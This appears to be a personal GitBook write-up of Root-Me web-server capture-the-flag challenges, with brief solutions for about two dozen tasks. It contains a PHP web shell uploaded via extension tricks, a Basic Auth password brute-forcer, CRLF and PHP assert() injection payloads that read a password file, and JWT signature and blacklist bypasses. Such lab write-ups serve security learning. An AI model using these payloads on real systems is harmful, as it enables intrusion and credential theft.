---
description: 'Note : A JOURNEY TO GAIN KNOWLEDGE'
cover: ../../.gitbook/assets/web.webp
coverY: 0
---

# 🏝 Web - Server

## Web - Server

### 1.[HTML - Source code](https://www.root-me.org/en/Challenges/Web-Server/HTML-Source-code)

F12 for flag

### 2.[HTTP - IP restriction bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)

``[`document`](https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c)``

![](<../../.gitbook/assets/image (39) (1).png>)

> **Syntax: X-Forwarded-For: \<client>,\<proxy1>,\<proxy2>,\<proxy3>**

Change IP at client to private IP by adding _**an X-Forwarded-For**_ header

![](<../../.gitbook/assets/image (13) (2).png>)

### 3.[HTTP - Open redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect)

![](<../../.gitbook/assets/image (35) (2) (1).png>)

It combines URL and hash md5 of that one, so that we just put other URL and hash of it.

![](<../../.gitbook/assets/image (29) (1).png>)

### 4.HTTP - User-agent

change User-Agent to \`admin\`

![](<../../.gitbook/assets/image (18) (2).png>)

### 5.Weak password

```
import requests
from requests.auth import HTTPBasicAuth
url = "http://challenge01.root-me.org/web-serveur/ch3/"
usr = "admin"
words = open('common_password.txt','r').read().split('\n')
cnt =1
for pwd in words:
	print(pwd,cnt)
	
	res = requests.get(url, auth=HTTPBasicAuth(usr, pwd))
	
	if "401" not in res.text:
		print('Password is ' + pwd)
		break
	cnt +=1
```

![](<../../.gitbook/assets/image (39).png>)

### 6.PHP - Command injection

![](<../../.gitbook/assets/image (32) (2).png>)

![](<../../.gitbook/assets/image (33) (2).png>)

``[`document`](https://portswigger.net/web-security/os-command-injection)``

### 7.Backup file

Use dirsearch find some interesting files:

![](<../../.gitbook/assets/image (24).png>)

> /web-serveur/ch11/index.php\~

### 8.HTTP - Directory indexing

> [http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt](http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt)
>
>

![](<../../.gitbook/assets/image (5) (3).png>)

### 9.HTTP - Headers

With normal request we will get:

![](<../../.gitbook/assets/image (1) (2).png>)

add Header to request:

> Header-RootMe-Admin: True

![](<../../.gitbook/assets/image (32).png>)

### 10.HTTP - POST

![](<../../.gitbook/assets/image (2) (3) (1).png>)

### 11.HTTP - Improper redirect

Capture before it redirect

![](<../../.gitbook/assets/image (3) (1) (2) (1).png>)

### 12.HTTP - Verb tampering

Ban đầu tưởng bruteforce ngồi xài hydra và cái rockyou.txt ra spam cả tiếng&#x20;

![](<../../.gitbook/assets/image (5) (4).png>)

temper ở đây là chỉ cần đổi method khác ngoài GET và POST là được, cứ PUT với DELETE mà phang

![](<../../.gitbook/assets/image (10) (2).png>)

### 13.File upload - Double extensions

```
<?php echo shell_exec($_GET['cmd']); ?>
```

set file.php.png and send to the server

![](<../../.gitbook/assets/image (16) (3).png>)

```
?cmd=cd;cat .passwd
```

### 14.File upload - MIME type

![](<../../.gitbook/assets/image (19) (3).png>)

Change Content-Type to image/png and rce

```
?id=cd;cat .passwd
```

### 15.HTTP - Cookies

![chan](<../../.gitbook/assets/image (1) (1) (4).png>)

change cookie from `visiteur` to `admin`

### 16.JSON Web Token (JWT) - Introduction

![](<../../.gitbook/assets/image (45).png>)

"none" signature algorithms

### 17.Directory traversal

![](<../../.gitbook/assets/image (7) (3).png>)

Try with ../ and fuzz

### 18.JSON Web Token (JWT) - Weak secret

![](<../../.gitbook/assets/image (46).png>)

bruteforce secret key: lol

![sign new signature](<../../.gitbook/assets/image (4) (1).png>)

POST and look for the flag hm....

![](<../../.gitbook/assets/image (11) (1).png>)

### 19.File upload - Null byte

create: `file.php%0a.png`

```
<?php echo shell_exec('id'); ?>
```

![](<../../.gitbook/assets/image (2) (1) (3).png>)

![](<../../.gitbook/assets/image (6) (2) (2).png>)

### 20.Install files

use dirsearch: /web-serveur/ch6/phpbb/install

![](<../../.gitbook/assets/image (8) (3).png>)

### 21. JWT - Revoked token

source

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
import datetime
from apscheduler.schedulers.background import BackgroundScheduler
import threading
import jwt
from config import *
 
# Setup flask
app = Flask(__name__)
 
app.config['JWT_SECRET_KEY'] = SECRET
jwtmanager = JWTManager(app)
blacklist = set()
lock = threading.Lock()
 
# Free memory from expired tokens, as they are no longer useful
def delete_expired_tokens():
    with lock:
        to_remove = set()
        global blacklist
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
            except:
                to_remove.add(access_token)
       
        blacklist = blacklist.difference(to_remove)
 
@app.route("/web-serveur/ch63/")
def index():
    return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
 
# Standard login endpoint
@app.route('/web-serveur/ch63/login', methods=['POST'])
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({"msg": "Bad username or password"}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
 
# Standard admin endpoint
@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg":"Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
 
 
if __name__ == '__main__':
    scheduler = BackgroundScheduler()
    job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
    scheduler.start()
    app.run(debug=False, host='0.0.0.0', port=5000)
```

Use python request to post data:

```
import requests

url = "http://challenge01.root-me.org/web-serveur/ch63/login"
myobj = {"username": "admin","password": "admin"}
x = requests.post(url, json = myobj)

print(x.text)
#{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjA3MzI2MjcsIm5iZiI6MTY2MDczMjYyNywianRpIjoiNzFjYTYxYTEtNjU1Yy00Zjk5LTkwM2ItODViZjBjMjI4ZmQ3IiwiZXhwIjoxNjYwNzMyODA3LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.7koOz8cupf0o2ZtMA_pr_03cKXq-uIcTgp6zGKMts-g"}
```

The problem that we have to bypass blacklist because with each access\_token it will be added to blacklist:

* with **rfc3548 we can** see that the character out of alphabet will be **** skipped

![](<../../.gitbook/assets/image (1) (3) (1).png>)

![](<../../.gitbook/assets/image (29).png>)

![](<../../.gitbook/assets/image (1) (1).png>)

* underscore **“\_” ,** then replace with “/” &#x20;

![](<../../.gitbook/assets/image (33).png>)

* add == in the end of jwt -> fast way to understand

![](<../../.gitbook/assets/image (9) (3).png>)

![](<../../.gitbook/assets/image (1) (4) (1).png>)

### 22. CRLF

Input -> fuzz&#x20;

Thử nhập bừa username và passoword ta thấy rõ log ghi lại username -> tấn công từ đây

![](<../../.gitbook/assets/image (7) (1).png>)

Mục tiêu là có thể log lại`adminauthenticated.`&#x20;

```
?username=admin authenticated.%0d%0aa&password=b
```

gửi payload trên url và urlencode để server decode lại&#x20;

![](<../../.gitbook/assets/image (8) (1).png>)

### 23. Insecure Code Management

``[<mark style="color:blue;">`doc`</mark>](https://levelup.gitconnected.com/exploiting-insecure-code-management-23fcd00eba60)<mark style="color:blue;">``</mark>

> [http://challenge01.root-me.org/web-serveur/ch61/.git](http://challenge01.root-me.org/web-serveur/ch61/.git)

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 24.PHP - assert()

``[`doc`](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert)``

[doc`2`](https://hoccyber.com/khai-thac-lfi/)``

**Detect** lỗi **File Inclusion -> LFI via PHP's 'assert**

Khả nghi:

```
GET /web-serveur/ch47/?page= ...
```

command:

```
' and die(system("cat .passwd")) or '
```

<figure><img src="../../.gitbook/assets/image (6) (2) (1).png" alt=""><figcaption></figcaption></figure>

